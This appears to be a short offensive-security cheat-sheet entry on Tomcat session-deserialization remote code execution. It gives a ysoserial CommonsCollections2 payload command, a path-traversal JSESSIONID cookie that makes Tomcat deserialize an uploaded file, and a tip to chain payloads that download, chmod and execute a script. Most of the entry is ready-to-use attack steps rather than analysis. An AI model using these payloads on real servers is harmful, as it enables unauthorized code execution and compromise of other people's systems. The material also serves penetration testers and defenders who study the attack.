# Tomcat Session Deserialization RCE (JSESSIONID Path Traversal)

If Tomcat stores uploaded files somewhere under its own tree and deserializes session files by name from the `JSESSIONID` cookie, point that cookie at an uploaded malicious serialized object instead of a real session.

```bash
# 1. craft a ysoserial gadget-chain payload and upload it via any file-upload feature
java -jar ysoserial-all.jar CommonsCollections2 '<command>' > payload.session

# 2. point JSESSIONID at the uploaded file via path traversal to make Tomcat deserialize it
Cookie: JSESSIONID=../../../../../temp/uploads/payload
```

Multi-stage in practice: one payload downloads a script, a second `chmod`s it, a third executes it — keeps individual ysoserial payloads small and avoids command-length/escaping issues.
